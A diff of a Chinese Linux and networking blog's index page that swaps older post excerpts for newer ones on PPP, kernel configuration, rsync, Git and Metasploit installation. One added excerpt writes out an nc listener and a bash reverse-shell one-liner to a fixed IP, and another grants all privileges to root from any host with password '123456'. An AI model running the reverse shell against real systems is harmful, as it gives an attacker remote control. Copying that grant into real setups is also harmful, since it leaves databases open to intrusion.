@@ -232,8 +232,8 @@
       
         
   <h2 class="title">
-    <a href="/DEVELOP/编写多进程、线程同步问题总结.html">
-      编写多进程、线程同步问题总结
+    <a href="/SYSTEM/Linux下NC反弹shell命令.html">
+      Linux下NC反弹shell命令
     </a>
   </h2>
 
@@ -261,7 +261,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-23</p>
+    <p>2017-11-08</p>
   </a>
 </div>
 
@@ -271,9 +271,9 @@
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/DEVELOP/' rel="nofollow">
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>DEVELOP</p>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
     </a>
   </div>
 
@@ -300,16 +300,27 @@
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      注: 多进程时所主要解决的就是进程同步问题。
+      本机开启监听：
 
- 1. 进程同步:
-    进程同步的主要任务是对多个相关进程在执行次序上进行协调，以使并发执行的诸进程之间能有效地共享资源和相互合作，从而使程序的执行具有可再现性。
+12
 
-1.1 进程同步存在的问题:
-一、两种
+nc -lvnp 4444nc -vvlp 4444
+
+目标机器开启反弹
+bash版本：
+
+1
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+perl版本：
+
+1
+
+perl -e 'use S
       
         <div class="readmore">
-          <a href="/DEVELOP/编写多进程、线程同步问题总结.html" class="flat-box">
+          <a href="/SYSTEM/Linux下NC反弹shell命令.html" class="flat-box">
             <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
             阅读全文
           </a>
@@ -336,8 +347,8 @@
       
         
   <h2 class="title">
-    <a href="/DEVELOP/pty示例代码.html">
-      pty示例代码
+    <a href="/SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html">
+      Linux 内核编译 —— make localmodconfig 简化内核配置流程
     </a>
   </h2>
 
@@ -365,525 +376,7 @@
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-17</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/DEVELOP/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>DEVELOP</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      #define _XOPEN_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <string.h>
-#include <sys/types.h>
-#inc
-      
-        <div class="readmore">
-          <a href="/DEVELOP/pty示例代码.html" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/NETWORK/4G路由器移植pptp方案总结.html">
-      4G路由器移植pptp方案总结
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="http://demonelf.github.io" rel="nofollow">
-      
-        <i class="fas fa-user" aria-hidden="true"></i>
-      
-      <p>madhex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-17</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/NETWORK/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>NETWORK</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      概览
-pppoe总框架原理
-
-
-pptp总框架原理
-
-
-ppp可行性分析
-本文介绍
-​ 现需要在我们自己公司的4G路由器上移植pptp功能. 4G路由器硬件为mips.本来只需把开源的pptp和pppd编译对应的mips版本即可.但是由于4G路由本身有一套
-      
-        <div class="readmore">
-          <a href="/NETWORK/4G路由器移植pptp方案总结.html" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/NETWORK/Linux PPP 框架分析.html">
-      Linux PPP 框架分析
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="http://demonelf.github.io" rel="nofollow">
-      
-        <i class="fas fa-user" aria-hidden="true"></i>
-      
-      <p>madhex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-15</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/NETWORK/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>NETWORK</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      1. 介绍
-
-通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本：
-
-Software version
-Linux内核 2.6.15
-PPPd ppp-
-      
-        <div class="readmore">
-          <a href="/NETWORK/Linux PPP 框架分析.html" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/NETWORK/linux 下创建GRE隧道.html">
-      linux 下创建GRE隧道
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="http://demonelf.github.io" rel="nofollow">
-      
-        <i class="fas fa-user" aria-hidden="true"></i>
-      
-      <p>madhex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-15</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/NETWORK/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>NETWORK</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      其他国家的互联网如同一个孤岛。要想访问国外网站异常的缓慢，甚至被和谐了。可以建立一条隧道来避免这种情况，下面说说GRE隧道如何建立。
-
- 1. GRE介绍
-    GRE隧道是一种IP-over-IP的隧道，是通用路由封装协议，可以对某些网路层协议的数据报
-      
-        <div class="readmore">
-          <a href="/NETWORK/linux 下创建GRE隧道.html" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/EMBEDDED/mini2440/文件系统理解.html">
-      文件系统笔记
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="http://demonelf.github.io" rel="nofollow">
-      
-        <i class="fas fa-user" aria-hidden="true"></i>
-      
-      <p>madhex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-12</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  
-  <div class='new-meta-item category'>
-    <a href='/categories/EMBEDDED/mini2440/' rel="nofollow">
-      <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>EMBEDDED&nbsp;/&nbsp;mini2440</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            
-
-          
-        
-          
-            
-
-          
-        
-      </div>
-      
-        <hr>
-      
-    </div>
-  </section>
-
-
-  <section class="article typo">
-    <div class="article-entry" itemprop="articleBody">
-      以下都是自己瞎理解，并不一定对，但会慢慢完善。
-
-我们可以想象下，linux文件系统，是吧我们想利用的资源，以虚拟一种树状目录结构管理。最初我们主要想把，硬盘上的内容以树状的结构管理起来。
-但是发现，其实好多硬件都可以放到这个树中。例如：字符设备串口等。
-
-      
-        <div class="readmore">
-          <a href="/EMBEDDED/mini2440/文件系统理解.html" class="flat-box">
-            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
-            阅读全文
-          </a>
-        </div>
-      
-    </div>
-    
-  </section>
-</article>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <article class="post reveal ">
-  
-
-
-  <section class='meta'>
-    
-    
-    <div class="meta" id="header-meta">
-      
-        
-  <h2 class="title">
-    <a href="/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html">
-      gentoo【显卡-驱动-xorg-gnome-gui】工作原理
-    </a>
-  </h2>
-
-
-      
-      <div class='new-meta-box'>
-        
-          
-        
-          
-            
-  <div class='new-meta-item author'>
-    <a href="http://demonelf.github.io" rel="nofollow">
-      
-        <i class="fas fa-user" aria-hidden="true"></i>
-      
-      <p>madhex</p>
-    </a>
-  </div>
-
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-09</p>
+    <p>2017-11-08</p>
   </a>
 </div>
 
@@ -922,21 +415,14 @@ PPPd ppp-
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      显卡->驱动->xorg->gnome->gui
+      简介：
+前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。
+刚刚找了一下这个方面的资料，分享一下。
 
-查看显卡：lspci | grep -i VGA
-
-查看驱动：lspci -vvv
-​ 
-
-/dev/nvidia0, /dev/nvidiactl
-
-是NV 官方驱动引入的两个设备文件
-
-驱动安装：x1
+Most people uses the kernel shipped b
       
         <div class="readmore">
-          <a href="/SYSTEM/gentoo【显卡-驱动-xorg-gnome-gui】如何工作.html" class="flat-box">
+          <a href="/SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html" class="flat-box">
             <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
             阅读全文
           </a>
@@ -963,8 +449,8 @@ PPPd ppp-
       
         
   <h2 class="title">
-    <a href="/SYSTEM/gentoo_stage_diy.html">
-      gentoo_stage_diy
+    <a href="/SYSTEM/mariadb配置允许远程访问方式 .html">
+      mariadb配置允许远程访问方式
     </a>
   </h2>
 
@@ -992,7 +478,7 @@ PPPd ppp-
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-09</p>
+    <p>2017-11-03</p>
   </a>
 </div>
 
@@ -1002,9 +488,9 @@ PPPd ppp-
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/SYSTEM/' rel="nofollow">
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>SYSTEM</p>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
     </a>
   </div>
 
@@ -1031,14 +517,16 @@ PPPd ppp-
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      stage1：
+      首先配置允许访问的用户，采用授权的方式给用户权限
 
-    包含bootstrap.sh，
-    scripts/bootstrap.sh用于安装
-    glibc、gcc、zlib、binutils、textinfo、ncurses、gettext、sed、emerge、portag
+1
+
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION;
+
+说明：root是登陆数据库的用
       
         <div class="readmore">
-          <a href="/SYSTEM/gentoo_stage_diy.html" class="flat-box">
+          <a href="/SYSTEM/mariadb配置允许远程访问方式 .html" class="flat-box">
             <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
             阅读全文
           </a>
@@ -1065,8 +553,8 @@ PPPd ppp-
       
         
   <h2 class="title">
-    <a href="/SYSTEM/x11vnc利用xvfd实现远程vncserver.html">
-      x11vnc利用xvfd实现远程vncserver
+    <a href="/SYSTEM/gentoo安装metasploit4.14步骤.html">
+      gentoo安装metasploit4.14步骤
     </a>
   </h2>
 
@@ -1094,7 +582,7 @@ PPPd ppp-
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-08-09</p>
+    <p>2017-10-19</p>
   </a>
 </div>
 
@@ -1104,9 +592,9 @@ PPPd ppp-
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/SYSTEM/' rel="nofollow">
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>SYSTEM</p>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
     </a>
   </div>
 
@@ -1133,21 +621,22 @@ PPPd ppp-
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      当然你可以直接安装vncserver实现以下功能。
-例如：TigerVNC
+      先来个小忍者看看
 
-环境：gentoo
 
-安装：xvfd
 
-sudo USE=”xvfb” emerge -av xorg-server
-
-启动：xvfd
-
-Xvfb :2 -screen 0 80
+环境准备
+ 1. make.conf中添加
+    
+    RUBY_TARGETS=”ruby23”
+    
+    
+ 2. /etc/portage/package.keywords 中添加
+    
+    =dev-l
       
         <div class="readmore">
-          <a href="/SYSTEM/x11vnc利用xvfd实现远程vncserver.html" class="flat-box">
+          <a href="/SYSTEM/gentoo安装metasploit4.14步骤.html" class="flat-box">
             <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
             阅读全文
           </a>
@@ -1174,8 +663,8 @@ Xvfb :2 -screen 0 80
       
         
   <h2 class="title">
-    <a href="/EMBEDDED/mini2440/编写操作系统思路.html">
-      编写操作系统思路
+    <a href="/SYSTEM/rsync指定ssh端口号.html">
+      rsync指定ssh端口号
     </a>
   </h2>
 
@@ -1203,7 +692,7 @@ Xvfb :2 -screen 0 80
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2017-07-31</p>
+    <p>2017-10-13</p>
   </a>
 </div>
 
@@ -1213,9 +702,9 @@ Xvfb :2 -screen 0 80
             
   
   <div class='new-meta-item category'>
-    <a href='/categories/EMBEDDED/mini2440/' rel="nofollow">
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
       <i class="fas fa-folder-open" aria-hidden="true"></i>
-      <p>EMBEDDED&nbsp;/&nbsp;mini2440</p>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
     </a>
   </div>
 
@@ -1242,21 +731,532 @@ Xvfb :2 -screen 0 80
 
   <section class="article typo">
     <div class="article-entry" itemprop="articleBody">
-      计算机基本硬件：I/O接口 硬盘 内存 CPU 时钟 看门狗
-
-​ 内存(有可能需要考虑 MMU和cache等)
-
-​ CPU(中断)
-
-操作系统分为 两部分 ：
-
- 1. 资源部分：以文件系统的方式呈现
- 2. 调度部分：以多进程的方式呈现
-
-操作系统说
+      rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/
       
         <div class="readmore">
-          <a href="/EMBEDDED/mini2440/编写操作系统思路.html" class="flat-box">
+          <a href="/SYSTEM/rsync指定ssh端口号.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/DEVELOP/软件架构模式.html">
+      软件架构模式
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://demonelf.github.io" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>madhex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2017-10-10</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/DEVELOP/DEVELOP/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>DEVELOP&nbsp;/&nbsp;DEVELOP</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      软件架构模式 Mark Richards 著
+版权归 © 2015 O’Reilly Media, Inc. 所有. 
+
+原书发布链接为Software Architecture Patterns.
+
+译员信息
+
+本书的译员均来自 开发技术前线 www.d
+      
+        <div class="readmore">
+          <a href="/DEVELOP/软件架构模式.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/LIVE/如何提高自己.html">
+      如何提高自己
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://demonelf.github.io" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>madhex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2017-10-09</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/LIVE/LIVE/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>LIVE&nbsp;/&nbsp;LIVE</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      1. 平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。
+    
+     
+    
+    
+ 2. 为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还
+      
+        <div class="readmore">
+          <a href="/LIVE/如何提高自己.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/DEVELOP/Git常用命令图表.html">
+      Git 常用命令图表
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://demonelf.github.io" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>madhex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2017-09-21</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/DEVELOP/DEVELOP/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>DEVELOP&nbsp;/&nbsp;DEVELOP</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      有这几个git命令就够用了
+
+
+
+示例: 保存本地/home/example_a目录到本地/home/example_b目录
+
+12345678
+
+cd /home/example_bgit init --barecd /home/example_agit
+      
+        <div class="readmore">
+          <a href="/DEVELOP/Git常用命令图表.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/VPN系列之五花八门/ppp协议总结.html">
+      ppp协议总结
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://demonelf.github.io" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>madhex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2017-09-19</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/VPN系列之五花八门/VPN系列之五花八门/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>VPN系列之五花八门&nbsp;/&nbsp;VPN系列之五花八门</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      协议规范
+实现原理
+1234567891011121314151617181920212223242526272829303132333435363738
+
+struct ppp_info{	int unit;			/**/	int dev_fd;			/
+      
+        <div class="readmore">
+          <a href="/VPN系列之五花八门/ppp协议总结.html" class="flat-box">
+            <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
+            阅读全文
+          </a>
+        </div>
+      
+    </div>
+    
+  </section>
+</article>
+
+          </div>
+        
+      
+        
+          <div class='post-wrapper'>
+            <article class="post reveal ">
+  
+
+
+  <section class='meta'>
+    
+    
+    <div class="meta" id="header-meta">
+      
+        
+  <h2 class="title">
+    <a href="/SYSTEM/从wordpress换hexo博客后.html">
+      从wordpress换hexo博客后
+    </a>
+  </h2>
+
+
+      
+      <div class='new-meta-box'>
+        
+          
+        
+          
+            
+  <div class='new-meta-item author'>
+    <a href="http://demonelf.github.io" rel="nofollow">
+      
+        <i class="fas fa-user" aria-hidden="true"></i>
+      
+      <p>madhex</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+    <p>2017-09-19</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/SYSTEM/SYSTEM/' rel="nofollow">
+      <i class="fas fa-folder-open" aria-hidden="true"></i>
+      <p>SYSTEM&nbsp;/&nbsp;SYSTEM</p>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+
+          
+        
+          
+            
+
+          
+        
+      </div>
+      
+        <hr>
+      
+    </div>
+  </section>
+
+
+  <section class="article typo">
+    <div class="article-entry" itemprop="articleBody">
+      之前用wordpress做blog, 为什么换为hexo呢?
+
+第一 
+
+​ wordpress的文章都保存在服务器的数据库, 维护不是很直观.
+
+​ 而hexo是自己编写markdown文章,本地一份,而blog只是本地的映射.
+
+​ 这样文章更好维护和
+      
+        <div class="readmore">
+          <a href="/SYSTEM/从wordpress换hexo博客后.html" class="flat-box">
             <i class="fas fa-book-open fa-fw" aria-hidden="true"></i>
             阅读全文
           </a>
@@ -1486,25 +1486,37 @@ Xvfb :2 -screen 0 80
         
           <li><a class="flat-box" title="/categories/DEVELOP/" href="/categories/DEVELOP/"><div class='name'>DEVELOP</div><div class='badge'>(4)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/EMBEDDED/" href="/categories/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(95)</div></a></li>
+          <li><a class="flat-box child" title="/categories/DEVELOP/DEVELOP/" href="/categories/DEVELOP/DEVELOP/"><div class='name'>DEVELOP</div><div class='badge'>(4)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/EMBEDDED/" href="/categories/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(15)</div></a></li>
         
           <li><a class="flat-box child" title="/categories/EMBEDDED/mini2440/" href="/categories/EMBEDDED/mini2440/"><div class='name'>mini2440</div><div class='badge'>(3)</div></a></li>
         
           <li><a class="flat-box" title="/categories/LIVE/" href="/categories/LIVE/"><div class='name'>LIVE</div><div class='badge'>(3)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/NETWORK/" href="/categories/NETWORK/"><div class='name'>NETWORK</div><div class='badge'>(12)</div></a></li>
+          <li><a class="flat-box child" title="/categories/LIVE/LIVE/" href="/categories/LIVE/LIVE/"><div class='name'>LIVE</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/NETWORK/" href="/categories/NETWORK/"><div class='name'>NETWORK</div><div class='badge'>(11)</div></a></li>
         
           <li><a class="flat-box" title="/categories/SYSTEM/" href="/categories/SYSTEM/"><div class='name'>SYSTEM</div><div class='badge'>(12)</div></a></li>
         
+          <li><a class="flat-box child" title="/categories/SYSTEM/SYSTEM/" href="/categories/SYSTEM/SYSTEM/"><div class='name'>SYSTEM</div><div class='badge'>(9)</div></a></li>
+        
           <li><a class="flat-box" title="/categories/VPN系列之五花八门/" href="/categories/VPN系列之五花八门/"><div class='name'>VPN系列之五花八门</div><div class='badge'>(2)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/arm/" href="/categories/arm/"><div class='name'>arm</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box child" title="/categories/VPN系列之五花八门/VPN系列之五花八门/" href="/categories/VPN系列之五花八门/VPN系列之五花八门/"><div class='name'>VPN系列之五花八门</div><div class='badge'>(2)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/embedded/" href="/categories/embedded/"><div class='name'>embedded</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box" title="/categories/arm/" href="/categories/arm/"><div class='name'>arm</div><div class='badge'>(78)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/linux/" href="/categories/linux/"><div class='name'>linux</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box child" title="/categories/arm/EMBEDDED/" href="/categories/arm/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(78)</div></a></li>
         
-          <li><a class="flat-box" title="/categories/笑看人生/" href="/categories/笑看人生/"><div class='name'>笑看人生</div><div class='badge'>(0)</div></a></li>
+          <li><a class="flat-box" title="/categories/linux/" href="/categories/linux/"><div class='name'>linux</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box child" title="/categories/linux/EMBEDDED/" href="/categories/linux/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box" title="/categories/笑看人生/" href="/categories/笑看人生/"><div class='name'>笑看人生</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box child" title="/categories/笑看人生/EMBEDDED/" href="/categories/笑看人生/EMBEDDED/"><div class='name'>EMBEDDED</div><div class='badge'>(1)</div></a></li>
         
       </ul>
     </div>
@@ -1518,27 +1530,6 @@ Xvfb :2 -screen 0 80
           
           
             
-  <section class='widget tagcloud'>
-    
-<header class='pure'>
-  <div><i class="fas fa-fire fa-fw" aria-hidden="true"></i>&nbsp;&nbsp;热门标签</div>
-  
-    <a class="rightBtn"
-    
-      rel="nofollow"
-    
-    
-    href="/blog/tags/"
-    title="blog/tags/">
-    <i class="fas fa-expand-arrows-alt fa-fw"></i></a>
-  
-</header>
-
-    <div class='content pure'>
-      <a href="/tags/linux/" style="font-size: 14px; color: #999">linux</a>
